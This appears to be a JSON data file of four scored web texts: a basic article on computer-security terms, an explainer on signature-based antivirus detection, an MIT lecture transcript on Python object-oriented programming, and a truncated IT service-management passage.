[
    {
        "text": "With the development of science and technology, computer has become more and more popular in our daily life, which is intended to be a part of our life. But at the same time it also brings the safety problem, because increasing number of bad people would like to break into computer systems to steal the secret information. It seems that computer safety has been a serious problem by now. Maybe you could learn something about the safety terms in Microsoft so that you could adopt the different methods according to different cases. What is malware? In fact malware, short for “malicious software”, is any kind of software which is installed without your complete permission and is not in need at all.The famous malware areviruses, worms, and Trojan horses, which are almost known to us all. Even though you are not familiar with them, you must have heard of it at ordinary times. If you want to protect your computer from the malware, you could make sure that the automatic updating is turned on all the time to get the latest updates. 2 antispyware software Antispyware software helps protect your computer, and prevent the pop-ups, slow performance, and security threats caused by spyware and other adverse software. Every computer user must keep antispyware software up to date in order to keep in touch with the latest spyware. Aimed at protecting our computer, we could use Microsoft Security Essentials, free download software, to be against spyware and other malicious software. A firewall is used to help screen out hackers, viruses, and worms that try to attack your computer through the Internet.In fact, if you are the one who use the computer at home, the most efficient and important step is to enable firewall when you start your computer. A virus will slip through and infect you; the only effective way by protecting yourself is using a firewall. A firewall monitors your Internet connections and allows you to specify which programs are allowed to connect and which are not. 4 antivirus software Antivirus software is a kind of computer program which can be used to test, defend, and take actions to remove or delete malicious software program. As we all know, computer virus is some programs, which can specially disturb computer operation. So we should update antivirus software in regular time to prevent against the latest virus. 5 Windows password Besides the above mentioned software, you could have an alternative at the same time, namely Windows password. With a password like this, you can prevent your privacy from being let out or being viewed. Of course you should set up a Windows password reset disk to set the password reset in case that you forget it. As a computer user, you should have a general knowledge of these safety terms so that you can protect your computer better. And with these terms, your computer can be protected better than that without them. In a word, please have a brief understanding of them in the first place, and then you could know how important they are.",
        "prob": "tensor([[2.1746e-06, 1.0000e+00]])"
    },
    {
        "text": "Just as there are many variants and forms of electronic malware and Internet-based threats around the globe, so there are many forms of protection against these threats. Signature-based detection is one of the multifarious forms of defense that have been developed in order to keep us safe from malicious content. Although signature-based detection can be argued to have been overshadowed by more sophisticated methods of protection in some environments, it remains as a core ‘technique’ featuring in the anti-virus controls of packages and suites that work to protect a user’s system today. How does signature-based detection work? Signature-based detection works by scanning the contents of computer files and cross-referencing their contents with the “code signatures” belonging to known viruses. A library of known code signatures is updated and refreshed constantly by the anti-virus software vendor. If a viral signature is detected, the software acts to protect the user’s system from damage. Suspected files are typically quarantined and/or encrypted in order to render them inoperable and useless. Clearly there will always be new and emerging viruses with their own unique code signatures. So once again, the anti-virus software vendor works constantly to assess and assimilate new signature-based detection data as it becomes available, often in real time so that updates can be pushed out to users immediately and zero-day vulnerabilities can be avoided. Next-generation signature-based detection New variants of computer virus are of course developed every day and security companies now work to also protect users from malware that attempts to disguise itself from traditional signature-based detection. Virus authors have tried to avoid their malicious code being detected by writing “oligomorphic“, “polymorphic” and more recently “metamorphic” viruses with signatures that are either disguised or changed from those that might be held in a signature directory. Despite these developments, the Internet at large does of course still function on a daily basis. Populated as it is by users who not only have up to date security software installed, but also by those who have educated themselves as to the type of risks discussed here.",
        "prob": "tensor([[2.0515e-06, 1.0000e+00]])"
    },
    {
        "text": "Topics covered: Encapsulation, inheritance, shadowing Instructor: Prof. Eric Grimson, Prof. John Guttag OPERATOR: The following content is provided under a Creative Commons license. Your support will help MIT OpenCourseWare continue to offer high quality educational resources for free. To make a donation or view additional materials from hundreds of MIT courses, visit MIT OpenCourseWare at ocw.mit.edu. PROFESSOR: Last lecture we were talking about classes, and object-oriented programming, and we're going to come back to it today. I'm going to remind you, we were talking about it because we suggested it is a really powerful way of structuring systems, and that's really why we want to use it, It's a very common way of structuring systems. So today I'm going to pick up on a bunch of more nuanced, or more complex if you like, ways of leveraging the power of classes. But we're going to see a bunch of examples that are going to give us a sense. I'm going to talk about inheritance, we're going to talk about shadowing, we're going to talk about iterators. But before get to it, I want to start by just highlighting, sort of, what was the point of classes? So I'll remind you. A class, I said, was basically a template for an abstract data type. And this was really to drive home this idea of modularity. I want the ability to say, I've got a set of things that naturally belong together, I'm going to cluster them together, I want to treat it like it's a primitive, I want to treat it like it's a float or an int or a string. Is this going to be a point or a segment or something different like that. So it's really a way, as I said, of just trying to cluster data together. And this is a notion of modularity slash abstraction where I'm treating them as primitives. But the second thing we talked about is that we also have a set of methods, using the special name method because we're talking classes. But basically functions that are designed to deal with this data structure. We're trying to group those together as well. So we cluster data and methods. Second key thing we said was, in the ideal case, which unfortunately Python isn't, but we'll come back to that, in the ideal case, we would have data hiding, and by data hiding, which is sort of a version of encapsulation, what we meant was that you could only get to the internal pieces of that data structure through a proscribed method. Proscribed meaning it's something I set up. So data hiding saying, you would only access the parts through a method. And as we said, unfortunately Python does not enforce this. Meaning that I could create one of these data structures, ideally I'd have a method, that I'm going to see some examples of that I used to get the parts out, unfortunately in Python you could take the name the instance dot some internal variable you'll get it back. It is exposed. And this is actually just not a good idea. So I suggested in my very bad humor, that you practice computational hygiene and you only use appropriate methods to get the parts out. OK didn't laugh the joke last time, you're not going to laugh at it this time, I don't blame you. All right, and then the last piece of this is that we said the class is a template. When we call that class, it makes an instance. So class is used to make instances, meaning particular versions, of that structure, and we said inside the instances we have a set of attributes. Internal variables, methods, that are going to belong to that structure. OK, so with that in mind, here's what I want to do. I'm going to show you a set of examples, and I want to warn you ahead of time, the code handout today is a little longer than normal because we want to build essentially an extended example of a sequence of examples of classes. We're going to see the idea, of which we're gonna talk about, of inheritance or hierarchy, in which we can have classes that are specializations of other classes. We're gonna see how we can inherit methods, how we can shadow methods, how we can use methods in a variety of ways. So this is a way of suggesting you may find it more convenient to put notes on the code handout rather than in your own notes. Do whatever you like, but I just wanted to alert you, we're going to go through a little more code than normal. So, the little environment I'm going to build is an environment of people. I'll build a simple little simulation of people. So I'm going to start off with the first class, which I've got up on the screen, and it's on your handout as well, which is I'm going to build an instance, or a class rather, of persons. I'm going to draw a diagram, which I'm gonna try and see if I can do well, over here, of the different objects we're going to have. So I've got, a class, and by the way a class is an object. Instances are also objects, but classes are objects. We're gonna see why we want that in a second. Because I'm gonna build an object, sorry a class, called a person. Now, let's walk through some of the pieces here. The first one is, there's something a little different. Remember last time we had that keyword class and then a name, that name, in this case, person says this is the name for the class, and then we would have just had the semicolon and a bunch of internal things. Here I've got something in parens, and I want to stress this is not a variable. All right, this is not a def, this is a class. I'm going to come back to it, but what this is basically saying is that the person class is going to inherit from another class, which in this case is just the built-in Python object class. Hold on to that thought, it's going to make more sense when we look at a little more interesting example, but I want to highlight that. All right now, if we do this, as I said before, we can create a version of a person, let me just call it per, person. OK? And what we said last time is, when we wanted to create an instance inside of this class definition, we've got one of those built-in things called init. I'm gonna again remind you, some of the methods we have, Underbar underbar init is going to be the thing that creates the instance. Actually slightly misspeaking, actually Python creates the instance, but it's one thing that fills it in. So in this case, I'm going to give it 2 arguments: Frank Foobar Now, you might have said, wait a minute, init here has 3 arguments: self, family name, and first name. So again, just to remind you, what we said happens here is that when I call this class, person, I'm creating an instance. We'll draw a little instance diagram down here. I'm going to give it the name per. And I should have said inside of person, we've got a set of things. We've got our underbar underbar init, we've got, what else do I have up there? Family name. And a bunch of other methods, down to say. What happens inside of Python is, when we called the class definition, person, it creates an instance, there it is. Think of it as a pointer to a spot in memory, and then what we do is, we call, or find, that init method, up here, and we apply it. And the first argument self, points to the instance. So this object here is what self looks at. Now you can see what init's going to do. It says, oh, inside of self, which is pointing to here, let me bind a variable, which was, can read that very carefully, it's family underbar name, to the value I passed in, which was 4. Same thing with first name. OK, so the reason I'm stressing this is, self we do not supply explicitly, it is supplied as pointing to the instance, it's giving us that piece of memory. And that is what then gets created. So here's, now, the instance for per. OK, and I put a little label on there, I'm going to call that an isALink, because it is an instance of that class. God bless you. All right, so once we got this, let's look at what we can do with person. That's why I built person here. And as I said, I've already bound basically, those two pieces. If I want to get a value out, I can give person, or per, rather, this instance, a messaging. In this case I want to get family, what did I say, family name out, now, again I want to stress, what is happening here? per is an instance, it's this thing here. When I say per dot family name, I'm sending it a message, in essence what that does is, it says, from here it's going to go up the chain to this class object and find the appropriate method, which was family name. It is then going to apply that to self, which points to this instance. And that allows it, therefore, is you can see on the code, to look up under self, what's the binding for family name, and print it back up. So self is always going to point to the instance I want and I can use it. OK what else do we have in here? We can get the first name, that's not particularly interesting. We've got 2 other special methods: that's cmp and str. All right, cmp is our comparison method. And since I, I was about to say I blew it last time, I misspoke last time, a wonderful phrase that politicians like to use, I misspoke last time. Let me clarify again what cmp will do. Underbar underbar cmp is going to be the method you're going to use to compare two instances of an object. Now, let's back up for second. If I wanted to test equality, in fact I could use underbar underbar eq, under under. It's natural to think about an equality tester as returning a Boolean, it's either gonna be true or false, because something's either equal to or not. In many languages, comparisons also return Booleans, which is why I went down this slippery slope. For many languages, either it's greater than or it's not. But Python is different. Python use cmp, in fact it has a built in cmp, which is what we're relying on here. Where am I, right there. And what cmp returns is 1 of 3 values. Given 2 objects, it says if the first one is less than the second one, it returns -1, if it's equal it returns 0, if it's greater than, it returns 1. So it allows you this broader range of comparisons. And if you think about it, cmp, you could apply on integers, you could apply it on floats, apply it on strings. So it's overloaded, it has the ability to do all of those. And in this case what we're saying is, given 2 objects, let's create a tuple of the first, sorry, family and first name of ourselves, and other is another object, family and first name of that, and then just use cmp to compare them. All right, so it's going to use the base pieces. OK, so it gives me a way of doing comparisons. And str we saw last time as well, this is cmp does comparison, and str is our printed representation. OK. So what we've got now, is a simple little class. We've also got two methods there. I want to look at them, we're gonna come back to them, but they start to highlight things we can do with our classes. So I've built one simple version of it here, which is per. And notice I've got another method, right up here, called say. And say takes two arguments, for the moment the second argument, or the first argument's, not going to make a lot of sense, but say takes two arguments besides itself. It's going to take another object to which it's saying something and the thing to say. Since I only have one object here, I'm going to have person talk to himself. You may have met a few other undergraduates who have this behavior. I'll have him talk to himself and say, just some random message the faculty members occasionally worry about. OK, what does this thing do? Now you're going to see some of the power of this. Again, remember, I'm down here, I'm sending this the message say, it's going to go up the chain to find the say message in person. And what does say do, it says given another object and some string, it's going to return, oh, and interesting things, part of which you can't see on the screen. First what it does, is it gets first name of self. Remember self is pointing to this instance, so it's simply looks up that binding, which is Frank. It's going to create a string in which it adds to that the family name of self, and then another thing that says to, and then ah, I'm now going to send a message to the other object, saying give me your first name. Going to add that to the second piece, and you can see in this case it happens to be the same first and family name. And then at the end of it, which you can't see here but you can see in your handout, I just append the whole string, so it spits it out. What's the point of this, other than I can get it to say things? Notice, I can now reference values of the instance. But I can also get values of other instances, by sending in a message. And that's why we have that form right there. And then it glued all together. If you think about this for a second, you might say, wait a minute, actually you might have said wait a minute a while ago, why am I just using the variable name there in the function over here? Well in fact, I could've used the function here, first name open close, right? It would have done the same thing. But because I know I'm inside the instance, it's perfectly reasonable to just look up the value. OK, I could have, although I don't want you to do it, have done the same thing there and used underbar, sorry, first name underbar, sorry, first underbar name, but that's really breaking this contract that I want to happen. I should send the message to get the method back out. So again the standard practices is if you know you're inside the object, you can just access the values. If you're doing it with any other objects, send it a message to get it out. OK, now, that gives you an ability to say, let's look at one more example here, and then we're going to start building our hierarchy, which is, that this person can also sing. And we've got a little sing method here. And notice what it does, it's going to sing to somebody, I guess you're part of the Chorallaries. You're going to sing something, and notice what it does, it's simply going to use its say method, but add at the end of whatever's being said, just tra la la at the end. So this is now an example of a method using another method. Why would you want that? It's nice modularly. I have one method that's doing saying, I have another method that's just building on it. So if I have is person sing to themselves, not a highly recommended activity, it would help if I had it sing to itself, not sing to sing, sorry about that. Notice what it does. Looks like exactly like a say method, except it's got tra la la at the end. Don't worry I'm not going to sing to you. I'll simply say the words. Power of this, other than the silly examples. You see how I can access variables of the instance, how I can access variables of other instances, going to come back to that, and how I can use versions of my own methods to implement other methods. In this case sing is using say as part of what it wants to get out. OK, so we got a simple little example. Now, let's start adding some other pieces to this. OK, and what do I want to add. Find my spot here. OK, we're going to add an MIT person. Sorry, machine is -- do this, let's go down. OK so I'm going to add an MIT person. Look at the code for second. Aha! Notice what this says. MIT person says it inherits from person. That is, that's the first thing in parens up there. It says, you know, class of MIT person is person. What that is saying is, that this is a specialization of the person class. Or another way of saying it is, we have a super class, in this case it's person. And we have a subclass, in this case its MIT person. And we're going to walk through some examples, but what it says is that that subclass of MIT person can inherit the attributes of the person class. Can inherit the methods, it can inherit variables. OK, what does MIT person do? Well, here's 1 of the new things it does. It has a local variable called next id num, which is initially set to 0. See that up there. And then it's got some methods, it's got an init method, a get id method, a few other things. OK, let's run this. In particular, I go back down to this one. Let me just uncomment this and do it here. Assuming my machine will do what I want it to do, which it really doesn't seem to want to do today. Try one more time. Thank you, yep. Still not doing it for me, John. OK, we type it. No idea what Python doesn't like me today, but it doesn't. So we're gonna define p 1, I've lost my keyboard, indeed I have. Try one more time. p 1 MIT person, see how fast I can type here -- OK, now, let's look at what the code does, because again it's going to highlight some things. I called MIT person, push this up slightly, it's going to create an instance down here, I called p 1. And when I would do that, I'm gonna initialize it. So I've got, right up here, an initializer, init for MIT person, takes in the family name and the first name. Notice what it does. Huh. It says, if I'm sitting here at MIT person, I'm going to go up and inherit from person its init function and call it. And what am I calling it on? I'm calling it on self, which is pointing to this object, so I've still got it, and then I'm then going to apply the base initialization. And that does exactly what you'd expect, which is just going to create a binding for family name down here. As well as some other things. So this is an example of inheritance. MIT person inherits the init method from person, can get access to by simply referring to it, and I refer to it right there. And it's take the person class, get its init and apply it to my instance plus those things. So I'm just using the same piece of code Notice the second thing it does. It says inside of self, I'm going to bind the local variable id name to the value of next id name in MIT person. Self is down here, id num, sorry, not id name. I'm going to bind that to the value that I find my going up to here, which is 0, and having done that, I simply increment that value. OK? So what has this done? It says I now have captured in the class, a local variable that I can keep track of. And when I use it, every time I generate an example, let me build another one. I make p 2 another MIT person. OK, I can do things like saying, what is the id number for each of these. First one is 0, second one is 1, which makes sense, right? I'm just incrementing a global variable. Now, things I want you to see about this. Now that I've got a beginning of a hierarchy, I have this notion of inheritance. I can ask a function inside one class to use a function from a class that it can reach by going up the chain. I just did it there. I can ask it to go get values of variables, right, so that looks good. What else do we have in person or MIT person? Well, we can get the id number, we just did. We have a thing to do with this string. Notice it's going to print out something a little different. In fact, there's a kind of funky form there. Which just says, if I want to print it out, I'm gonna create, what this says to do is, I'm gonna create an output template that has that structure to it, but where I see that percent s I'm going to substitute this value for the first one, that value for the second. So if I say, what is p 1? It says ok, MIT person Fred Smith. On the other hand, if I said, what is per, which is that thing I build earlier, it had a different string method, which is just print out person, those pieces. All right, one last piece to this and we're going to add to it. Suppose I want Fred to say something. Say something to Jane. OK, he said it. Where's the say method? OK, Fred is an instance of an MIT person. where's the say method? Well, there isn't one there, but again, that's where the hierarchy comes in. Fred is this object here, I'm sending it the message say. That turns into going up the chain to this object, which is the class object, and saying find a say method and apply it to that instance. Fudge-knuckle, it ain't here. Don't worry about it, because it says if I can't find one there, I'm going to go up the chain to this method, sorry to this class, and look for a method there. Which there was one, I have a say method. It's going to use that say method. Apply to it. Well, you might say, OK, what happens if it isn't there? Well, that's where, remember I defined person to be an instance of an object, it will go up the chain one last time to the base object in Python to see is there a method there or not. Probably isn't a say method for an object, so at that point it's going to raise an exception or throw an error. But now you again see this idea that the inheritance lets you capture methods. Now you might say, why not just put a say method inside of MIT person? Well, if you wanted it to do something different, that would be the right thing to do. But the whole notion here's that I'm capturing modularity, I've got base methods up in my base class. If I just want to use them I'm just going to inherit them by following that chain, if you like, basically up the track. OK, so we've got an MIT person, we can use that. Let's add a little bit more to our hierarchy here. I'm going to create, if I can do this right, a specialization of an MIT person, which is an undergraduate. A special kind of MIT person. All right, so if I go back up here, even though my thing is not going to let me do it, let's build an undergraduate. OK, there's the class definition for an undergrad. We're just starting to see some of the pieces, right, so in an undergraduate, where am I here, an undergraduate. OK, it's also got an initialization function. So if I call undergrad, I'm gonna make an undergrad here, again let me go back down here, line ug 2 it's making undergrad, Jane Doe. Now, what happens when I do the initialization here? Notice what goes on. It simply calls the person initialization method. All right, so I'm down here. I'm going to call the person initialization method, what did do? Sorry, the MIT person method, it calls the person method. Just walking up the chain, that's going to do exactly what I did with all the other ones, so I now have a family name and a first name. So I can, for example, say family name and get it back out. All right? And then, other things that I can do, well I can set what year the person's in, I can figure out what year they're in, there's this unfortunate overflow error if you've hung around too long, but that's not going to happen to you. And I've now got a say method here, so let's look what happens if I ask the undergraduate to say something. OK, it's not a realistic dialogue I know, but, what did this method do? I asked this object to do a say. And notice what it does. It simply passes it back up to MIT person. There's that inheritance again. It's saying, I'm going to have my base say method say something. I'm going to say it to a person, but all I'm going to do because undergraduates in my experience, at least, are always very polite, I'm going to put \"Excuse me but\" at the front of it. OK, what am I trying to show you here? I know the jokes are awful, but what am I trying to show you here? That I can simply pass up the chain to get it. In fact, what method does the final say here? What class does it come from? Person class, yes, thank you. It goes all the way up to person, right, because MIT person didn't have a say. So I can simply walk up the chain until I find the method I want to have. Now this is an example of shadowing. Not a great example, but it's a beginning example of shadowing, in that this same method for an undergraduate, shadows the base say method, it happens to call it, but it changes it. It puts \"Excuse me but\" at the front, before it goes on to do something. Now again, I could have decided here to actually copy what the original say method did, stitch all the other things together. But again, that loses my modularity. I'd really to only have to change it in one place. So by putting my say method up in person, I can add these nuances to it, and it lets me have something that has that variation. If I decide I want to change what say does, I only have to change it in one place. It is in the person class definition, and everything else will follow through for free. OK, so now I've got an undergrad, right? Let's look at a couple of variations of what happens here. So first of all, I can -- yes? PROFESSOR 2: Shadowing here is often sometimes called overriding. PROFESSOR: Yes, thank you, because I'm going to do a pure example of shadowing in a second, John right. Also called overriding. Part of the reason I like the phrase shadow is, if you think about it as looking at it from this direction, you see this version of init before you see the other ones, or you see that version of say, but it is overriding the base say example. OK, so I can say, what does p 1, sorry, yes, what does undergrad look like? And I said wait a minute, MIT person, not undergrad, is that right? Well, where's the str method? I didn't define one in undergrad, so it again tracks up the chain and finds the str method here, so it's OK undergrads are MIT people most the time, so it's perfectly fine. OK, now, I have built into this also these cmp methods. So I've got two examples. I've got undergrad, or ug. And then I've got poor old Frank Foobar back there, per person. So suppose I want to compare them? What do you think happens here? Compare sounds weird, right, I compare an undergraduate to a person. I don't know what that's doing, some kind of weird psychological thing, but what do you think happens in terms of the code here if I run this. I know it's a little hard because you got a lot of code to look at. Do I have a cmp method defined somewhere? Yeah. So, it's hard to know what it's going to do, but let's look at it. Hmm. Now sometimes I type things and I got errors I don't expect, this one I did expect. So what happened here? Well let's talk about what happens if I do that comparison I was doing, what was I doing? Ug greater than per? What unwinds into is, I'm going to send to ug, that instance, a cmp method. This is really going to become something like ug dot under under cmp under under applied to per. I think that's close. What does that do? It says starting in ug, I'm going to look for the first cmp method I could find, which is actually sitting here. I had a cmp method in MIT person. If you look at your code, what does it do? It looks up the id numbers to compare them. Well the, ug has an id number because it was created along this chamber. Remember per over here was just created as a person. It doesn't have an id number, so that's why it complaints. Ok, happens if I do that? Compare per to ug. How many people think I get an error? Wow. How many people think I'm going to get either true or false out of this? A few brave hands. Why? Can I ask you, please? Why do you think I'm going to get a, doesn't matter whether it's true or false, why am I going to have something work this time that didn't work last time? PROFESSOR: Yeah, exactly. And in case you didn't hear it, thank you, great answer, sorry, terrible throw. In this case I'm using per, that's the first part, so it's not symmetric. It's gonna use per to do the look up. And as it was said there, per over here goes up and finds a cmp method here which it can apply. In that case, it simply looked at, remember, it took the tuples of first and last name which are both defined here, and did some comparison on that. So this is a way of again pointing out to you that the things are not always symmetric, and I have to be careful about where do I find the methods as I want to use them. Ok? All right. Let's add, I'm gonna do two more classes here. Let's add one more class, some people debate whether these are really people or not, but we're going to add a class called a professor. OK. Now what am I doing? I'm creating another version of class down here. Which again is an instance, or a subclass, sorry, not an instance, a subclass of an MIT person. I see that because I built it to be there. Again I've got an initialization that's going to call the person initialization, which we know is going to go up -- I keep saying that -- going to call the MIT person initialization, which is going to go up and call this one. So again I'm going to be able to find names. And I do a couple of other different things here. I'm gonna pass in a rank, full professor, associate professor, assistant professor, which I'm just going to bind locally. But I'm gonna add one other piece here, which is I'm gonna add a little dictionary on teaching. So when I create a professor, I'm gonna associate with it a dictionary that says, what have you been teaching? And then notice the methods I create. I've got a method here called add teaching, takes, obviously a pointer to the instance. A term, which will just be a string, and a subject. And let's look at what it does right here. OK. In fact the call I'm going to make, I'm not certain I'm going to be able to get away with it, my machine is still wonderfully broken, all right, it is, let me just show you what the calls would look like. As you can see here I'm not going to be able to do them. But I'm going to add teaching, as a method call with this with a string for term, and a subject number. What is this going to do? Yeah, I know I'm just worried if I restart Python, I may not be able to pull the thing back in, so I'm going to try and wing it, John, and see if I can make it happen. Right, what does that teaching do? It's got one of those try except methods. So what does it say it's going to do? It's going to go into the dictionary associated with teaching, under the value of term, and get out a list. And it's going to append to the end of the list the new subject. So it's going to be stored in there, is then going to be term, and a list of what I taught, in case I teach more than one thing each term. It's going to do that, but notice it's a try. If in fact there is no term currently in the dictionary, started out empty, it's going to throw an error, sorry, not throw an error, it's going to raise an exception. Which is a key error, in which case notice what I'm going to do, I'm not going to treat it as an error. I'm simply going to say, in that case, just start off with an empty, with an initial list with just that subject in and put it in the dictionary. As I add more things in, I'll just keep adding things to this dictionary under that term. And if I want to find out what I'm doing, well I can use get teaching, which says given the term, find the thing in the dictionary under that term and return it. If I get an error, I'm going to raise it, which says there is nothing for that term, and in that case I guess I'm just going to return none. OK? And then the other two pieces we're going to have here, and we want to look at a little more carefully, I just wanted to show you that example, is a professor can lecture, and a professor can say something. Look at the say method, because this now add one more nuance to what we want to do here. And I think in interest of making this go, let me actually, since I'm not going to get my machine to do this right, let me create a couple of professors. If I look at what that is, it's an MIT person because I didn't have any separate string thing there, and we will create a more important professor. What rank do you want, John? Do you want to stay full? PROFESSOR 2: Undergraduate. PROFESSOR: Undergraduate, right, a lot more fun I agree. Sorry about that, and we can again just see what that looks like. And that of course, we'll print out, he's also an MIT person. But now here's what I want to do. I want to say something to my good colleague Professor Guttag. Actually I'm going to start a separate -- I'm going to say something to a smart undergraduate. So if I say, remember we have ug defined as an undergraduate, let me do something a little different here. Well let, me do it that way. It says, I don't understand why you say you were enjoying 6.00. Not a good thing to say, right, but if I say to my good colleague Professor Guttag. I have to spell say right, I know, I need help with this, what can I say? We flatter each other all the time. It's part of what makes us feel good about ourselves. Why is the sky blue? I enjoyed your paper, but why is the sky blue? OK, terrible examples, but what's going on here? One more piece that I want to add. Here's my say method for professor, and now I'm actually taking advantage of to whom I am saying something. Notice again, what does it do? There's the self argument, that's just pointing to the instance of me. I'm passing in another argument, going to call it to who, in one case it was ug, in one case it was Guttag. And then the thing I want to say, ah, look what it does, it says, check the type. And the type is going to take that instance, I had an instance, for example, of a professor down here, and it's going to pick up what type of object it is. So if the type of the person I'm speaking to is undergrad, let's pause for second. Remember I started away back saying we're building abstract data types. Well, here's a great example of how I'm using exactly that, right? I've got int, I've got float, I now have ug, it's a type. So it's says if the object to whom I'm speaking is an undergrad, then use the same method from person where I'm going to put this on the front. On the other hand, if the object to whom I'm speaking is a professor, then I'm going to tag this on the front and use the underlying say method. On the other hand, if I'm speaking to somebody else, I'm just going to go lecture. All right, and when a professor lectures, they just put it's obvious on the end of things, as you may have noticed. What's the point I want you to see here? I'm now using the instances to help me to find what the code should do. I'm looking at the type. If the type is this, do that. If the type is this, do something different, ok? And I can now sort of build those pieces up. OK, I said one more class. Notice what we're doing. I know they're silly examples, but, sorry, they are cleverly designed examples to highlight key points. What I'm trying to do is show you how we have methods inherit methods, how have message shadow methods, how we have methods override methods, how we can use instances as types to define what the method should do. Let me show you one last class, because I'm gonna have one more piece that we want to use. And the last class is, sort of, once you've got a set of professors, you can have an aggregate of them. And I don't know, if a group of geese are gaggle, I don't know what a set of professors are, John. Flamers? I, you know, we've got to figure out what the right collective noun here is. We're going to call them a faculty for lack of a better term, right? Now the reason I want to show you this example is, this class, notice, it only is going to inherit from object. It actually makes sense. This is going to be a collection of things, but it's not a subclass of a particular kind of person. And what I want the faculty to do, is to be able to gather together a set of faculty. So if I go down here, grab this for second, and pull it down so you can see it. It looks like I'm not going to be able to run this because my machine is broken, but basically I'm gonna define a set of professors, and then I'm gonna create a new class called faculty. There's the definition of it. It's got an init. You can kind of see what it does. It's going to set up an internal variable called names, which is initially an empty list, internal variable called ids, which is empty, an internal variable called members, which is empty, and another special variable called place, which we're going to come back to in a second, initially bound to none. OK, I've got a method called add which I'm going to use down here to add professors to the course 6 faculty. Here's what I want to add to do. First of all, notice I'm going to check the type. If this is not a professor, I'm gonna raise an error, a type error, it's the wrong type of object to pass in. The second thing I'm gonna do is say, if that's okay, then let me go off and get the id number. Now remember, that's right up here, so I'm asking the instance of the professor to go up and get the id number. And I want to make sure I only have one instance of each professor in my faculty, so if the id number is in the list of ids already, I'm going to raise an error, sorry, raise an exception as well, saying I've got a duplicate id. OK? And the reason that's going to come up is, notice what I do now. Inside of the instant self, I take the variable names and I add to it the family name of the person I just added. OK, notice the form. I'm using the method, there's the parens to get the family name of the person. I'm just adding it to the list. I've got the id number, I've added the ids, and I add the object itself into members. So as I do this, what am I doing? I'm creating a list, actually several lists: a list of ids, a list of the actual instances, and a list of the family names. And as a cost I want to add, that's why I can check and see, is this in here already or not? Now, the last reason I want to do this is, I want to be able to support things like that. This is now different, right, this instance is a collection. I want to be able to do things like, for all the things in that collection, do something, like print out the family names. And to do that, I need two special forms: iter and next. OK, now let me see if I can say this cleanly. Whenever I use a for, in structure, even if it was on just a normal list you built, what Python is doing is returning an, what is called an iterator. Which is something that we talked earlier. It's keeping track of where are you in the list, and how do I get to the next thing in the list? I'm going to do the same thing here, and I'm going to create it for this particular structure. So this little thing iter, when I call a for something in, one of these instances, it calls iter, and notice what it does. It initializes place to 0. That was that variable I had up there. That's basically saying I'm at the beginning of the list. It's a pointer to the beginning of the list, and it returns self. Just gives me back a pointer to the instance. That now allows me at each step in that loop to call next. And what does next do? Next says, check to see if that value is too long, if it's longer than, for example, the list of names, raise an exception called stop iteration, which the for loop will use to say OK, I'm done. I'm going to break out of the for loop. Otherwise, what am I going to do? I'll increment place by 1, that's going to move me to the next place in the list, and then in this case I'll just return the instance itself, right? Members is a list of instances, place I've incremented by 1, I take 1 off of it, I get to it. So iter and next work together. Iter creates this method, that's going to give you a pointer to the place in the structure, and then next literally walks along the structure giving you the next element and returning elements in turn so you can do something with it. Right, so now what that says is, I can have classes that just have local variables. I can have classes that get methods from other variables, and I can also have classes that are collections. And I've supported that by adding in this last piece. OK once you have all of that, in principle we could start doing some fun things. So let's see what happens if we try and make all of this go. And let me, since I'm not going to be able to run it, let me simply do it this way. If I have my undergraduate, ug. I can -- sorry, let's not do it that way -- I can have undergraduate say things like -- all right, what did I just do wrong here? Do I not have undergrad defined? I do. Oh, I didn't have Grimson, sorry, it's me, isn't it? Thank you. The undergraduate very politely asks why he didn't understand, you can have the professor respond. Again, it simply puts a different thing into there. On the other hand, if Professor Guttag asks me something about understanding, I say I really like this paper on, you do not understand, it's a deep paper on programming languages 5, I think, John, isn't it? What else can you do with this thing, right? You can have an undergraduate talk to an undergraduate, in which case they're still polite. Or you could have -- sorry, let me do that the other way -- you could also have an undergraduate simply talk to a normal person. All right, but the good news is you know eventually you get it done, and when you're really done you can have the undergraduate be really happy about this, and so she sings to herself. OK it's a little silly, but notice what we've just illustrated. And this is where I want to pull it together. With a simple set of classes, and the following abilities, an ability to inherit methods from subclasses, sorry from superclasses, that is having this hierarchy of things. I can create a fairly complex kind of interaction. I can take advantage of the types of the objects to help me decide what to do. And if you think about that, I know it sounds very straightforward, but you would do exactly that if you were writing earlier code to deal with some numerical problem. All right, if the thing is an integer, do this, if it's a float, do that, if it's a string, do something else. I'm now giving you exactly the same ability, but the types now can be things that you could create. And what I've also got is now the ability to inherit those methods as they go up the chain. So another way of saying it is, things that you want to come away from here, are, in terms of these classes. We now have this idea of encapsulation. I'm gathering together data that naturally belongs as a unit, and I'm gathering together with it methods that apply to that unit. Just like we would have done with float or int. Ideally, we data hide, we don't happen to do it here, which is too bad. Basically we've got the idea of encapsulation. The second thing we've got is this idea of inheritance. Inheritance both meaning I can inherit attributes or field values. I can inherit methods by moving up the chain. I can also the shadow or override methods, so that I can specialise. And I do all of that with this nice hierarchy of classes. So what hopefully you've seen, between these two lectures, and we're going to come back to it in some subsequent lectures, is that this is now a different way of just structuring a computational system. Now, you'll also get arguments, polite arguments from faculty members or other experts about which is a better way of doing it. So I'll give you my bias, Professor Guttag will give you his bias next time around. My view, object-oriented system are great when you're trying to model systems that consist of a large number of units that interact in very specific ways. So, modeling a system of people's a great idea. Modeling a system of molecules is probably a great idea. Modeling a system where it is natural to associate things together and where the number of interactions between them is very controlled. These systems work really well. And we'll see some examples of that next week. Thanks.",
        "prob": "tensor([[0.0111, 0.9889]])"
    },
    {
        "text": "The Operations Layer defines the operational processes and procedures necessary to deliver Information Technology (IT) as a Service. This layer leverages IT Service Management concepts that can be found in prevailing best practices such as ITIL and MOF. The main focus of the Operations Layer is to execute the business requirements defined at the Service Delivery Layer. Cloud-like service attributes cannot be achieved through technology alone and require a high level of IT Service Management maturity. Change Management process is responsible for controlling the life cycle of all changes. The primary objective of Change Management is to eliminate or at least minimize disruption while desired changes are made to services. Change Management focuses on understanding and balancing the cost and risk of making the change versus the benefit of the change to either the business or the service. Driving predictability and minimizing human involvement are the core principles for achieving a mature Service Management process and ensuring changes can be made without impacting the perception of continuous availability. Standard (Automated) Change Non-Standard (Mechanized) Change It is important to note that a record of all changes must be maintained, including Standard Changes that have been automated. The automated process for Standard Changes should include the creation and population of the change record per standard policy in order to make sure auditability. Automating changes also enables other key principles such as: The Service Asset and Configuration Management process is responsible for maintaining information on the assets, components, and infrastructure needed to provide a service. Critical configuration data for each component, and its relationship to other components, must be accurately captured and maintained. This configuration data should include past and current states and future-state forecasts, and be easily available to those who need it. Mature Service Asset and Configuration Management processes are necessary for achieving predictability. A virtualized infrastructure 